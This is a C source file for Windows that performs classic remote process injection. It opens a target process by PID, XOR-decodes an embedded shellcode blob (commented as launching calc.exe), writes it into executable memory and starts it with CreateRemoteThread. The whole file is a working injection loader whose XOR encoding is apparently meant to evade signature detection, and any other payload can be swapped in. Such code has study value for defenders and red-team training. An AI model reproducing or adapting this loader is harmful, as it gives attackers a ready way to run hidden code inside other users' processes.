#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
int main(int argc, char* argv[]){
    if (argc == 1){
        printf("[*] Usage: inject.exe <PID>");
        return 0;
    }

    int pid = atoi(argv[1]);
    printf("[*] PID: %d\n", pid);

    HANDLE hProc = OpenProcess( // get a handle to a process
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );
    if (hProc == NULL){
        printf("[*] Failed to obtain handle, exiting...");
        return 0;
    }
    printf("[*] Obtained handle: %x\n", hProc);

	unsigned char key = '\x69'; // if payload isnt xor encrypted, set key to \x00

	unsigned char shellcode[] = //payload - calc.exe
		"\x95\x21\xea\x8d\x99\x81\xa9\x69\x69\x69\x28\x38\x28\x39\x3b\x38\x3f\x21\x58\xbb\x0c\x21\xe2\x3b\x09\x21\xe2\x3b\x71\x21\xe2\x3b\x49\x21\xe2\x1b\x39\x21\x66\xde\x23\x23\x24\x58\xa0\x21\x58\xa9\xc5\x55\x08\x15\x6b\x45\x49\x28\xa8\xa0\x64\x28\x68\xa8\x8b\x84\x3b\x28\x38\x21\xe2\x3b\x49\xe2\x2b\x55\x21\x68\xb9\xe2\xe9\xe1\x69\x69\x69\x21\xec\xa9\x1d\x0e\x21\x68\xb9\x39\xe2\x21\x71\x2d\xe2\x29\x49\x20\x68\xb9\x8a\x3f\x21\x96\xa0\x28\xe2\x5d\xe1\x21\x68\xbf\x24\x58\xa0\x21\x58\xa9\xc5\x28\xa8\xa0\x64\x28\x68\xa8\x51\x89\x1c\x98\x25\x6a\x25\x4d\x61\x2c\x50\xb8\x1c\xb1\x31\x2d\xe2\x29\x4d\x20\x68\xb9\x0f\x28\xe2\x65\x21\x2d\xe2\x29\x75\x20\x68\xb9\x28\xe2\x6d\xe1\x21\x68\xb9\x28\x31\x28\x31\x37\x30\x33\x28\x31\x28\x30\x28\x33\x21\xea\x85\x49\x28\x3b\x96\x89\x31\x28\x30\x33\x21\xe2\x7b\x80\x3e\x96\x96\x96\x34\x21\xd3\x68\x69\x69\x69\x69\x69\x69\x69\x21\xe4\xe4\x68\x68\x69\x69\x28\xd3\x58\xe2\x06\xee\x96\xbc\xd2\x89\x74\x43\x63\x28\xd3\xcf\xfc\xd4\xf4\x96\xbc\x21\xea\xad\x41\x55\x6f\x15\x63\xe9\x92\x89\x1c\x6c\xd2\x2e\x7a\x1b\x06\x03\x69\x30\x28\xe0\xb3\x96\xbc\x0a\x04\x0d\x47\x0c\x11\x0c\x49\x46\x0a\x49\x0a\x08\x05\x0a\x47\x0c\x11\x0c\x69";
	int shellcodesize=287;

	for (int i = 0; i < shellcodesize; i++){
		shellcode[i]=shellcode[i]^key;
	}



    LPVOID addr_pointer = VirtualAllocEx( // allocate the needed memory
		hProc,
		NULL,
		shellcodesize,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	);

	printf("[*] Pointer to allocated memory: %x\n", addr_pointer);

	bool res = WriteProcessMemory(
		hProc,
		addr_pointer,
		shellcode,
		shellcodesize,
		NULL
	);
	if (res==0){
		printf("something got fucked, exiting...");
		return 0;
	}
	printf("[*] Memory allocated succesfully\n");

	HANDLE hThread = CreateRemoteThread(
		hProc,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE) addr_pointer,
		NULL,
		0,
		NULL
	);


	printf("[*] Shellcode injected, exiting...");



    return 0;

}

